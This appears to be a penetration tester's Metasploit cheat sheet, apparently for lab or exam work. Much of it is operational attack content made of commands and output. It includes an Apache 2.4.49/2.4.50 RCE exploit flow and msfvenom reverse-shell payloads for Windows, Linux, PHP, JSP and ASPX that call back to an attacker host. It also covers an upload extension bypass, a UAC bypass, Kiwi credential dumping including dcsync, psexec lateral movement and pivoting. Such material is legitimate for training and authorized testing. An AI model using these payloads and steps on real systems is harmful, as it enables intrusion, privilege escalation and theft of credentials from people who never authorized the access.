[_Metasploit_](https://www.metasploit.com/)
- Exploit / Post-exploitation frameworks  
- open source / well-maintained by Rapid7  

Methodology
```text
enumerate services
  -> identify version / vulnerability / credentials
  -> search for relevant module
  -> read module info
  -> check required options
  -> choose payload deliberately
  -> run check if supported
  -> exploit
  -> manage session
  -> validate user context
  -> document evidence
```

## Table of Contents

- [Setup](#setup)
- [Database Workflow](#database-workflow)
- [Core Commands](#core-commands)
- [Module Workflow](#module-workflow)
		  - [Search Modules](#search-modules)
		  - [Use a Module](#use-a-module)
		  - [Set Options](#set-options)
		  - [Run or Check](#run-or-check)
- [Auxiliary Modules](#auxiliary-modules)
- [Exploit Modules](#exploit-modules)
- [Sessions](#sessions)
- [Payloads](#payloads)
		  - [Staged vs Non-Staged Payloads](#staged-vs-non-staged-payloads)
		  - [Meterpreter Payloads](#meterpreter-payloads)
- [msfvenom](#msfvenom)
		  - [List Payloads](#list-payloads)
		  - [Windows EXE Payloads](#windows-exe-payloads)
		  - [Linux ELF Payloads](#linux-elf-payloads)
		  - [PHP Payloads](#php-payloads)
		  - [JSP and WAR Payloads](#jsp-and-war-payloads)
- [multi/handler](#multihandler)
		  - [Staged Payload Handler](#staged-payload-handler)
		  - [Background Handler Job](#background-handler-job)
- [Meterpreter Basics](#meterpreter-basics)
		  - [System and User Info](#system-and-user-info)
		  - [Shells and Channels](#shells-and-channels)
		  - [File Transfer](#file-transfer)
		  - [Process Migration](#process-migration)
- [Windows Post-Exploitation](#windows-post-exploitation)
		  - [getsystem](#getsystem)
		  - [UAC Bypass Modules](#uac-bypass-modules)
		  - [Kiwi](#kiwi)
- [Pivoting](#pivoting)
- [Resource Scripts](#resource-scripts)
- [Common Mistakes](#common-mistakes)


---

## Setup

**Initialize the Database**

Metasploit can use PostgreSQL to store discovered hosts, services, credentials, notes, loot, and vulnerabilities.

```bash
sudo msfdb init
```

Enable PostgreSQL at boot:
```bash
sudo systemctl enable postgresql
```

**Launch msfconsole**

```bash
sudo msfconsole
```

Quiet mode:
```bash
sudo msfconsole -q
```

**Check database status:**

```text
msf6 > db_status

[*] Connected to msf. Connection type: postgresql.
```

### Workspaces

Workspaces keep results separated by lab, exam target, or engagement.

List workspaces:
```text
msf6 > workspace
```

Create and switch to a workspace:
```bash
msf6 > workspace -a lab

[*] Added workspace: lab  
[*] Workspace: lab  
```

Switch to an existing workspace:
```bash
msf6 > workspace lab
```


### Database Workflow

**Run Nmap Inside Metasploit**

`db_nmap` runs Nmap and imports the results into the Metasploit database.
```text
msf6 > db_nmap -sV -sC -p- target_ip
```

Common faster scan:
```text
msf6 > db_nmap -A target_ip
```

**Review Hosts, Services, Credentials, and Vulns**

List hosts:
```text
msf6 > hosts
```

List services:
```text
msf6 > services
```

Filter by port:
```text
msf6 > services -p 445
```

List credentials:
```text
msf6 > creds
```

List loot:
```text
msf6 > loot
```

List notes:
```text
msf6 > notes
```

List vulnerabilities Metasploit has recorded:
```text
msf6 > vulns
```

Use services output to populate `RHOSTS` automatically:
```text
msf6 auxiliary(scanner/smb/smb_version) > services -p 445 --rhosts
```

### Core Commands

```text
help              show help
search            search modules
show              show modules/options/payloads/targets
use               select module
info              show module details
info -d           show detailed module info
show options      show required/current options
show missing      show missing required options
show payloads     show compatible payloads
show targets      show available targets
set               set option
unset             unset option
setg              set global option
unsetg            unset global option
check             test whether target appears vulnerable, if supported
run               run module
exploit           run exploit module
run -j            run as background job
jobs              list background jobs
sessions -l       list sessions
sessions -i id    interact with session
sessions -k id    kill session
back              leave current module
```

---

## Module Workflow

### Search Modules

Search by service:
```text
msf6 > search smb
```

Search by module type:
```text
msf6 > search type:auxiliary smb
msf6 > search type:exploit apache
```

Search by CVE:
```text
msf6 > search cve:2021-42013
```

Search by platform:
```text
msf6 > search platform:windows smb
```

### Use a Module

Use by full path:
```text
msf6 > use auxiliary/scanner/smb/smb_version
```

Or use the index from search results:
```text
msf6 > use 0
```

### Set Options

Show options:
```text
msf6 auxiliary(scanner/smb/smb_version) > show options
```

Set a target:
```text
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS target_ip
```

Set multiple targets:
```text
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS target_ip-250
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS target_subnet/24
```

Set threads:
```text
msf6 auxiliary(scanner/smb/smb_version) > set THREADS 10
```

### Run or Check

If supported, run `check` before exploitation:
```text
msf6 exploit(module/path) > check
```

Run the module:
```text
msf6 auxiliary(scanner/smb/smb_version) > run
```

Run in background:
```text
msf6 exploit(module/path) > run -j
```


---

## Auxiliary Modules

Auxiliary modules are useful for enumeration, scanners, login checks, fuzzing, and other non-exploit tasks.

#### Example: SMB Version Detection

Search:
```text
msf6 > search type:auxiliary smb_version
```

Use module:
```text
msf6 > use auxiliary/scanner/smb/smb_version
```

Show options:
```text
msf6 auxiliary(scanner/smb/smb_version) > show options
```

Set target:
```text
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS target_ip
```

Run:
```text
msf6 auxiliary(scanner/smb/smb_version) > run
```

Expected value:
```text
SMB Detected
Host is running Version ...
```

Use
- identifies SMB dialects
- may reveal Windows version
- may record issues such as SMB signing not required
- helps decide whether SMB, relay, credential validation, or lateral movement checks are worth testing

#### Example: SSH Login Check

```bash
msf6 > use auxiliary/scanner/ssh/ssh_login
```

Show options:
```bash
msf6 auxiliary(scanner/ssh/ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   ...
```

Single username + password list:
```bash
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS target_ip
msf6 auxiliary(scanner/ssh/ssh_login) > set RPORT 22
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME username
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true
msf6 auxiliary(scanner/ssh/ssh_login) > run

[*] target_ip:22 - Starting bruteforce
...
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Useful options:
```text
USERNAME          single username
USER_FILE         usernames file
PASSWORD          single password
PASS_FILE         password file
USERPASS_FILE     username/password pairs
STOP_ON_SUCCESS   stop after first valid credential
VERBOSE           show failed attempts
CreateSession     create session after successful login
```

After success:
```text
msf6 > creds
msf6 > sessions -l
```

Common mistake:
- using login modules without checking lockout policy or authorization
- forgetting that successful credentials may automatically create a session
- using large wordlists when a smaller targeted list would be more appropriate


#### Example: tftpbrute

https://medium.com/@aashutos.katare/silent-servers-the-art-of-tftp-enumeration-265c3785a6b4

```bash
└─$ tftp TARGET_IP 
```

```bash
└─$ msfconsole      

msf6 > use auxiliary/scanner/tftp/tftpbrute
msf6 auxiliary(scanner/tftp/tftpbrute) > set RHOSTS TARGET_IP
msf6 auxiliary(scanner/tftp/tftpbrute) > run
[+] Found filename.cfg on TARGET_IP
[+] Found filename_1.cfg on TARGET_IP
[+] Found filename_2.cfg on TARGET_IP
[+] Found filename-confg on TARGET_IP
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf6 auxiliary(scanner/tftp/tftpbrute) > exit
```

```bash
└─$  tftp filename 
tftp> get filename.cfg
tftp> quit
```


---

## Exploit Modules

Exploit modules contain code for known vulnerabilities. Read module info before running.

### Exploit Review Checklist

Run:
```bash
msf6 exploit(module/path) > info
```

Look for:
```text
Name
Module path
Platform
Architecture
Rank
Targets
Check support
Required options
Payload options
Side effects
Stability
Reliability
References
Description
```

Important fields:
```text
Side effects     possible logs, artifacts, or cleanup
Stability        likelihood of crashing the target
Reliability      whether repeatable sessions are likely
Targets          OS/app/version-specific paths
Check support    whether safe vulnerability check exists
```

### Example: apache Exploit Flow

Search:
```bash
msf6 > search apache 2.4.49
```

Use module:
```bash
msf6 > use exploit/multi/http/apache_normalize_path_rce
```

Read info:
```bash
msf6 exploit(multi/http/apache_normalize_path_rce) > info

       Name: Apache 2.4.49/2.4.50 Traversal RCE  
     Module: exploit/multi/http/apache_normalize_path_rce  
   Platform: Unix, Linux  
       Arch: cmd, x64, x86  
...  
Module side effects:  
 ioc-in-logs  
 artifacts-on-disk  
  
Module stability:  
 crash-safe  
  
Module reliability:  
 repeatable-session  
  
Available targets:  
  Id  Name  
  --  ----  
  0   Automatic (Dropper)  
  1   Unix Command (In-Memory)  
  
Check supported:  
  Yes  
...  
  
Description:  
  This module exploit an unauthenticated RCE vulnerability which  
  exists in Apache version 2.4.49 (CVE-2021-41773). If files outside  
  of the document root are not protected by 'require all denied'  
  and CGI has been explicitly enabled, it can be used to execute  
  arbitrary commands (Remote Command Execution). This vulnerability  
  has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).  
...  
```

Show options:
```bash
msf6 exploit(multi/http/apache_normalize_path_rce) > show options

Module options (exploit/multi/http/apache_normalize_path_rce):  
  
   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   CVE        CVE-2021-42013   yes       The vulnerability to use (Accepted: CVE-2021-41773, CVE-2021-42013)
   DEPTH      5                yes       Depth for Path Traversal
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba
                                         sics/using-metasploit.html
   RPORT      443              yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /cgi-bin         yes       Base path
   VHOST                       no        HTTP server virtual host
  
Payload options (linux/x64/meterpreter/reverse_tcp):  
  
   Name   Current Setting  Required  Description  
   ----   ---------------  --------  -----------  
   LHOST                   yes       The listen address (an interface may be specified)  
   LPORT  4444             yes       The listen port  
  
...  
```

Set target options:
```bash
msf6 exploit(multi/http/apache_normalize_path_rce) > set RHOSTS target_ip
msf6 exploit(multi/http/apache_normalize_path_rce) > set RPORT 80
msf6 exploit(multi/http/apache_normalize_path_rce) > set SSL false
```

Set payload:
```bash
msf6 exploit(multi/http/apache_normalize_path_rce) > set payload linux/x64/shell_reverse_tcp
msf6 exploit(multi/http/apache_normalize_path_rce) > set LHOST kali_ip
msf6 exploit(multi/http/apache_normalize_path_rce) > set LPORT 4444
```

Run:
```bash
msf6 exploit(multi/http/apache_normalize_path_rce) > run
```

Validate shell:
```bash
id
whoami
hostname
pwd
```

Background session:
```text
Ctrl+Z

Background session? y
```

List sessions:
```bash
msf6 > sessions -l
```

Interact:
```bash
msf6 > sessions -i session_id
```


---

## Sessions

List sessions:
```bash
msf6 > sessions -l
```

Interact with a session:
```bash
msf6 > sessions -i session_id
```

Background a session:
```text
Ctrl+Z
```

or inside Meterpreter:
```bash
meterpreter > background
```

Kill a session:
```bash
msf6 > sessions -k session_id
```

Use:
- multiple targets can produce multiple sessions
- session IDs are used by post modules
- pivoting routes often depend on a specific session ID

---

## Payloads

### Staged vs Non-Staged Payloads

Metasploit naming helps identify staged vs non-staged payloads.

```text
Staged:
payload/linux/x64/shell/reverse_tcp

Non-staged:
payload/linux/x64/shell_reverse_tcp
```

Easy rule:

```text
staged payload     -> has another / before reverse_tcp
non-staged payload -> usually uses underscore, e.g. shell_reverse_tcp
```

| Type                  | Behavior                                         | Notes                                      |
| --------------------- | ------------------------------------------------ | ------------------------------------------ |
| Staged                | Sends small first stage, then downloads the rest | Often requires Metasploit handler          |
| Non-staged            | Sends full payload at once                       | More stable with `nc` and simpler handlers |
| Meterpreter staged    | Common Meterpreter style                         | Needs matching handler                     |
| Meterpreter stageless | Larger payload, fewer staging requests           | Useful when staging is unreliable          |
Tip:
- Prefer simple shells when possible.
- Use Meterpreter or staged payloads when you understand why you need them.
- Netcat generally cannot handle staged payloads.

### Meterpreter Payloads

Meterpreter is a feature-rich payload with post-exploitation commands.
- multi-functional payload  
- dynamically extended at run-time  
- payload reside in target memory + encrypted by default  
- :D in post-exploitation phase  
- all OS  

Common payloads:
```text
linux/x64/meterpreter_reverse_tcp
linux/x64/meterpreter_reverse_https
windows/x64/meterpreter_reverse_tcp
windows/x64/meterpreter_reverse_https
```

Reverse HTTPS can be useful when:
- outbound 443 is allowed
- raw TCP callbacks fail
- you need encrypted transport
- you want Meterpreter functionality

Example:
```bash
msf6 exploit(module/path) > set payload windows/x64/meterpreter_reverse_https
msf6 exploit(module/path) > set LHOST kali_ip
msf6 exploit(module/path) > set LPORT 443
```

Common mistake:
- assuming Meterpreter is always better. 
- It is more capable, but also more detectable and more complex.

e.g. Reverse TCP shell

```bash
msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads  
  
Compatible Payloads  
===================  
  
   #   Name                                              Disclosure Date  Rank    Check  Description  
   -   ----                                              ---------------  ----    -----  -----------  
   ...  
   7   payload/linux/x64/meterpreter/bind_tcp                             normal  No     Linux Mettle x64, Bind TCP Stager  
   8   payload/linux/x64/meterpreter/reverse_tcp                          normal  No     Linux Mettle x64, Reverse TCP Stager  
   9   payload/linux/x64/meterpreter_reverse_http                         normal  No     Linux Meterpreter, Reverse HTTP Inline  
   10  payload/linux/x64/meterpreter_reverse_https                        normal  No     Linux Meterpreter, Reverse HTTPS Inline  
   13  payload/linux/x64/meterpreter_reverse_tcp         .                normal  No     Linux Meterpreter, Reverse TCP Inline
   ...  
```

```bash
msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 13
```

```bash
msf6 exploit(multi/http/apache_normalize_path_rce) > show options  
...  
  
Payload options (linux/x64/meterpreter_reverse_tcp):  
  
   Name   Current Setting  Required  Description  
   ----   ---------------  --------  -----------  
   LHOST  192.168.45.156   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

...  
```

```bash
msf6 exploit(multi/http/apache_normalize_path_rce) > run
```

shell 
```bash
meterpreter > sysinfo  
meterpreter > getuid  
meterpreter > shell  

Process 194 created.  
Channel 1 created.  
```

new shell
```bash
meterpreter > shell  

Process 196 created.  
Channel 2 created.  

whoami  
username  
^Z  
Background channel 2? [y/N]  y  
```

list all active channels
```bash
meterpreter > channel -l  
```

interact with channel
```bash
meterpreter > channel -i 1  
Interacting with channel 1...  
  
id  
uid=1(username) gid=1(username) groups=1(username)  
```

File system commands
```bash
meterpreter > help  
...  
Stdapi: File system Commands  
============================  
  
    Command       Description  
    -------       -----------  
    cat           Read the contents of a file to the screen  
    cd            Change directory  
    checksum      Retrieve the checksum of a file  
    chmod         Change the permissions of a file  
    cp            Copy source to destination  
    del           Delete the specified file  
    dir           List files (alias for ls)  
    download      Download a file or directory  
    edit          Edit a file  
    getlwd        Print local working directory  
    getwd         Print working directory  
    lcat          Read the contents of a local file to the screen  
    lcd           Change local working directory  
    lls           List local files  
    lpwd          Print local working directory  
    ls            List files  
    mkdir         Make directory  
    mv            Move source to destination  
    pwd           Print working directory  
    rm            Delete the specified file  
    rmdir         Remove directory  
    search        Search for files  
    upload        Upload a file or directory  
...    
```

```  bash
meterpreter > lpwd  
/home/kali  
  
meterpreter > lcd /home/kali/Downloads  
  
meterpreter > lpwd  
/home/kali/Downloads  
  
meterpreter > download /etc/passwd  
[*] Downloading: /etc/passwd -> /home/kali/Downloads/passwd  
[*] Downloaded 1.74 KiB of 1.74 KiB (100.0%): /etc/passwd -> /home/kali/Downloads/passwd  
[*] download   : /etc/passwd -> /home/kali/Downloads/passwd  
  
meterpreter > lcat /home/kali/Downloads/passwd  
root:x:0:0:root:/root:/bin/bash  
...  
```  

run unix-privesc-check via upload file to /tmp on target  
```  
meterpreter > upload /usr/bin/unix-privesc-check /tmp/  
[*] uploading  : /usr/bin/unix-privesc-check -> /tmp/  
[*] uploaded   : /usr/bin/unix-privesc-check -> /tmp//unix-privesc-check  
  
meterpreter > ls /tmp  
Listing: /tmp  
=============  
  
Mode              Size     Type  Last modified              Name  
----              ----     ----  -------------              ----  
...  
100644/rw-r--r--  36801    fil   DATE -0400  unix-privesc-check  
```  
- show uploaded unix-privesc-check to target machine  
- target run Win OS -> escape backslashes in dest path `\\`  

```bash
meterpreter > exit  
[*] Shutting down Meterpreter... 
```

e.g. Reverse  HTTPS shell

```bash
msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads  
  
Compatible Payloads  
===================  
  
   #   Name                                              Disclosure Date  Rank    Check  Description  
   -   ----                                              ---------------  ----    -----  -----------  
   ...  
   36  payload/linux/x86/meterpreter_reverse_https       .                normal  No     Linux Meterpreter, Reverse HTTPS Inline
   ...  
```

```bash
msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 10 
msf6 exploit(multi/http/apache_normalize_path_rce) > show options  
msf6 exploit(multi/http/apache_normalize_path_rce) > run  
meterpreter >  

# post exploitation example 
meterpreter > search -f "passwords"
Found 1 result...
=================
```


---

## msfvenom

`msfvenom` generates payloads in formats such as EXE, ELF, PHP, ASPX, JSP, and WAR.
- Executable Payloads  

### List Payloads

```bash
msfvenom -l payloads
```

Filter by platform and architecture:
```bash
msfvenom -l payloads --platform windows --arch x64
```

e.g. create Windows binary for non-staged TCP reverse shell

```bash
# list payloads
msfvenom -l payloads --platform windows --arch x64  
...  
windows/x64/shell/reverse_tcp               Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker (Windows x64)  
...  
windows/x64/shell_reverse_tcp               Connect back to attacker and spawn a command shell (Windows x64)  
...  
```

```bash
# generate payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f exe -o nonstaged.exe       

Saved as: nonstaged.exe
```

```powershell
PS C:\Users\alice> iwr -Uri http://KALI_IP/nonstaged.exe -OutFile nonstaged.exe    
PS C:\Users\alice> ./nonstaged.exe
```  
  
```  bash
└─$ nc -nvlp 443 
Listening on 0.0.0.0 443
Connection received on ALICE_IP XXXXX

C:\Users\alice>whoami
domain\alice
```  

e.g. create Windows binary for staged TCP reverse shell

```bash
# generate payload
msfvenom -p windows/x64/shell/reverse_tcp LHOST=KALI_IP LPORT=443 -f exe -o staged.exe       

Saved as: staged.exe
```

```powershell
PS C:\Users\alice> iwr -Uri http://KALI_IP/staged.exe -OutFile nonstaged.exe    
PS C:\Users\alice> ./staged.exe
```  
  
```  bash
└─$ nc -nvlp 443 
Listening on 0.0.0.0 443
Connection received on ALICE_IP XXXXX

whoami

C:\Users\alice>exit

[*] ALICE_IP - Command shell session 1 closed.  Reason: User exit
```  


### Windows EXE Payloads

Non-staged Windows reverse shell:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali_ip LPORT=443 -f exe -o shell.exe
```

Staged Windows reverse shell:
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=kali_ip LPORT=443 -f exe -o staged.exe
```

Meterpreter reverse HTTPS:
```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=kali_ip LPORT=443 -f exe -o met.exe
```

Transfer to target:
```powershell
iwr -Uri http://kali_ip/shell.exe -OutFile shell.exe
.\shell.exe
```

### Linux ELF Payloads

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=kali_ip LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf
```

### PHP Payloads

```bash
msfvenom -p php/reverse_php LHOST=kali_ip LPORT=443 -f raw -o shell.php
```

Extension bypass example:
```bash
cp shell.php shell.pHP
```

Trigger after upload:
```bash
curl http://target_ip/uploads/shell.pHP
```

Use a matching handler for PHP reverse payloads.

### JSP and WAR Payloads

JSP:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=kali_ip LPORT=4444 -f raw -o shell.jsp
```

WAR:
```bash
msfvenom -p java/shell_reverse_tcp LHOST=kali_ip LPORT=4444 -f war -o shell.war
```

### ASP and ASPX

```bash
# asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=4444 -f asp > meterpreter.asp

# aspx 

#x86 default
msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -o shell.aspx

#x64
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -o shell.aspx
```

---

## multi/handler

`multi/handler` receives payload callbacks. It is especially important for staged payloads and Meterpreter.

### Staged Payload Handler

```text
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/shell/reverse_tcp
msf6 exploit(multi/handler) > set LHOST kali_ip
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > run
```

Then execute the matching payload on the target.

### Background Handler Job

Keep the handler running while continuing to use msfconsole:

```text
msf6 exploit(multi/handler) > set ExitOnSession false
msf6 exploit(multi/handler) > run -j
```

List jobs:

```text
msf6 > jobs
```

Stop a job:

```text
msf6 > jobs -k job_id
```

---

## Meterpreter Basics

### System and User Info

```bash
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid
meterpreter > ps
meterpreter > idletime
```

Drop to system shell:

```bash
meterpreter > shell
```

Return from shell to Meterpreter:
```text
exit
```

Background Meterpreter:
```bash
meterpreter > background
```

### Shells and Channels

Create a shell:
```text
meterpreter > shell
```

Background a shell channel:
```text
Ctrl+Z
Background channel? y
```

List channels:
```text
meterpreter > channel -l
```

Interact with a channel:
```text
meterpreter > channel -i channel_id
```

Close a channel:
```text
meterpreter > channel -c channel_id
```

### File Transfer

Show local working directory:
```text
meterpreter > lpwd
```

Change local working directory:
```text
meterpreter > lcd /home/username/Downloads
```

Show remote working directory:
```text
meterpreter > pwd
```

Download from target to Kali:
```text
meterpreter > download /etc/passwd
```

Upload from Kali to target:
```text
meterpreter > upload /path/to/file /tmp/
```

Windows destination path example:
```text
meterpreter > upload tool.exe C:\\Users\\Public\\tool.exe
```

Useful file commands:
```text
ls
dir
cat
search -f filename
download
upload
rm
mkdir
```

### Process Migration

Why migrate:
- avoid losing session if the original process dies
- move into a more stable process
- match architecture
- improve session stability

List processes:
```text
meterpreter > ps
```

Migrate:
```text
meterpreter > migrate pid
```

Spawn hidden process and migrate:
```text
meterpreter > execute -H -f notepad.exe
meterpreter > migrate pid
```

Common mistake:
- migrating into a process with incompatible architecture or insufficient privileges
- migrating into a noisy or unstable process
- assuming migration changes privileges in your favor

---

## Windows Post-Exploitation

### getsystem

`getsystem` attempts local privilege escalation to `NT AUTHORITY\SYSTEM`.

Check privileges first:
```cmd
whoami /priv
```

Inside Meterpreter:
```text
meterpreter > getuid
meterpreter > getsystem
meterpreter > getuid
```

What to look for:
```text
SeImpersonatePrivilege
SeDebugPrivilege
```

Common mistake:
- treating `getsystem` as guaranteed. It depends on the target, privileges, and available techniques.

### UAC Bypass Modules

UAC bypass modules = useful when the current user is a member of the local Administrators group, but the current process is still running at medium integrity.  
  
This often happens when access is gained through:  
- client-side attacks  
- web shells  
- reverse shells from user processes  
- Meterpreter sessions running inside a normal user context

note: local admin user != high-integrity process

Use if: 
current user is local admin  
	-> current process is medium integrity  
	-> admin actions fail or are restricted  
	-> UAC bypass may provide high-integrity session

Search:
```text
msf6 > search uac
```

Example module pattern:
```bash
msf6 > use exploit/windows/local/bypassuac_sdclt
msf6 exploit(windows/local/bypassuac_sdclt) > set SESSION session_id
msf6 exploit(windows/local/bypassuac_sdclt) > set LHOST kali_ip
msf6 exploit(windows/local/bypassuac_sdclt) > run
```

Check integrity level from a Windows shell:
```powershell
powershell -ep bypass

Import-Module NtObjectManager

Get-NtTokenIntegrityLevel
```

Possible values:
```text
Medium  -> normal user / unelevated admin process
High    -> elevated administrator process
System  -> NT AUTHORITY\SYSTEM
```

Common mistake:
- confusing local admin group membership with high-integrity execution.

Example: Meterpreter session running as `domain\alice` + process is medium integrity. -- -> Goal : obtain high-integrity Meterpreter session.

```bash
meterpreter > ps

PID    PPID   Name          Arch   Session   User          Path
4280   912    explorer.exe  x64    1         domain\alice  C:\Windows\explorer.exe
```

Migrate into the user process:
```bash
meterpreter > migrate 4280  
[*] Migrating from 3124 to 4280...  
[*] Migration completed successfully.  
  
meterpreter > getuid  
Server username: domain\alice
```

- the session now runs in the context of `domain\alice`
- the user may be a local administrator
- UAC may still restrict privileged actions
- integrity level should be checked before attempting bypass

Check Integrity Level using 
- Process Explorer
- PowerShell + NtObjectManager
- Meterpreter/process inspection where available

Using PowerShell with NtObjectManager:
```powershell
meterpreter > shell  

C:\Windows\system32> powershell -ep bypass  
C:\Windows\system32> Import-Module NtObjectManager  
C:\Windows\system32> Get-NtTokenIntegrityLevel
Medium
```

- the current process is running at medium integrity
- the user context may be admin, but the process is not elevated
- UAC bypass may be worth testing

```bash
Ctrl+Z  
Background channel 1? [y/N] y

meterpreter > background

msf6 > sessions -l
```

```bash
msf6 > search uac
msf6 > use exploit/windows/local/bypassuac_sdclt
msf6 exploit(windows/local/bypassuac_sdclt) > info
msf6 exploit(windows/local/bypassuac_sdclt) > show options
msf6 exploit(windows/local/bypassuac_sdclt) > set SESSION 3
msf6 exploit(windows/local/bypassuac_sdclt) > set LHOST kali_ip
msf6 exploit(windows/local/bypassuac_sdclt) > set LPORT 4444
msf6 exploit(windows/local/bypassuac_sdclt) > run

[*] Started reverse TCP handler on kali_ip:4444  
[*] UAC is Enabled, checking level...  
[+] Part of Administrators group! Continuing...  
[+] UAC is set to Default  
[+] BypassUAC can bypass this setting, continuing...  
[!] This exploit requires manual cleanup of 'C:\Users\alice\AppData\Local\Temp\update.exe'  
[*] Please wait for session and cleanup...  
[*] Sending stage ...  
[*] Meterpreter session 4 opened  
[*] Registry Changes Removed
```

- UAC was enabled
- `domain\alice` was part of the local Administrators group
- the bypass was attempted successfully
- a new Meterpreter session was created
- cleanup may be required

```bash
msf6 > sessions -l
msf6 > sessions -i 4
meterpreter > shell

powershell -ep bypass
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel
High
```

- UAC bypass succeeded
- the new process is elevated
- administrative actions are more likely to work
- this is still not necessarily `NT AUTHORITY\SYSTEM`

```bash
meterpreter > getuid
Server username: domain\alice

# try SYSTEM escalation after obtaining high integrity
meterpreter > getsystem
```


### Kiwi

Kiwi is a Meterpreter extension similar to Mimikatz. It generally requires high privileges or SYSTEM for useful credential access.

Load Kiwi:
```bash
meterpreter > load kiwi
```

Show Kiwi commands:
```bash
meterpreter > help
```

Common commands:
```bash
creds_all
creds_msv
creds_kerberos
lsa_dump_sam
lsa_dump_secrets
dcsync
dcsync_ntlm
kerberos_ticket_list
```

```bash
meterpreter > creds_msv

[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============
Username  Domain  NTLM                              SHA1
--------  ------  ----                              ----
```



---

## Pivoting

Metasploit can route traffic through an active Meterpreter session to reach internal networks.

### Manual Routes

Identify internal interfaces from the compromised host:
```cmd
ipconfig
```

Add route through session:
```bash
msf6 > route add internal_subnet/24 session_id
```

Example:
```bash
msf6 > route add INTERNAL_SUBNET_IP/24 1
```

Print routes:
```text
msf6 > route print
```

Remove routes:
```text
msf6 > route flush
```

Scan through the route:
```bash
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS internal_target_ip
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
msf6 auxiliary(scanner/portscan/tcp) > run
```

e.g. portscan -> SMB psexec to create bind shell  `windows/x64/meterpreter/bind_tcp`  
```bash
msf6 auxiliary(scanner/portscan/tcp) > run

[+] internal_target_ip:       - internal_target_ip:445 - TCP OPEN
[+] internal_target_ip:       - internal_target_ip:3389 - TCP OPEN
[*] internal_target_ip:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed 

msf6 auxiliary(scanner/portscan/tcp) > use exploit/windows/smb/psexec  
msf6 exploit(windows/smb/psexec) > set SMBUser smb_user  
msf6 exploit(windows/smb/psexec) > set SMBPass "smb_user_pw"
msf6 exploit(windows/smb/psexec) > set RHOSTS internal_target_ip
msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp  
msf6 exploit(windows/smb/psexec) > set LPORT 8000  
msf6 exploit(windows/smb/psexec) > run  
meterpreter >  
```

### Autoroute

Use `autoroute` to add routes based on the compromised host routing table.
```bash
msf6 > use multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION session_id
msf6 post(multi/manage/autoroute) > run
```

Print routes:
```bash
msf6 post(multi/manage/autoroute) > set CMD print
msf6 post(multi/manage/autoroute) > run
```

### SOCKS Proxy

Start a SOCKS proxy inside Metasploit:
```bash
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run -j
```

Configure `/etc/proxychains4.conf`:
```bash
tail /etc/proxychains4.conf  
...
socks5 127.0.0.1 1080
```

Use proxychains:
```bash
sudo proxychains nmap -sT -Pn -p 445,3389 internal_target_ip
sudo proxychains xfreerdp /v:internal_target_ip /u:username
```

### Port Forwarding

Inside Meterpreter:
```bash
meterpreter > portfwd -h
```

Forward local port to an internal host:
```bash
meterpreter > portfwd add -l 3389 -p 3389 -r internal_target_ip
```

Connect locally:
```bash
xfreerdp /v:127.0.0.1 /u:username
```

List forwards:
```bash
meterpreter > portfwd list
```

Remove all forwards:
```bash
meterpreter > portfwd flush
```

Pivoting payload note:
```text
If the internal host cannot route back to Kali, prefer bind payloads or route-aware approaches.
Reverse payloads from deeper internal hosts may fail unless a route exists back to Kali.
```



---

## Resource Scripts

Resource scripts automate Metasploit console commands.

Run msfconsole with a resource script:
```bash
sudo msfconsole -r listener.rc
```

Example `listener.rc`:
```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_https
set LHOST kali_ip
set LPORT 443
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
run -z -j
```

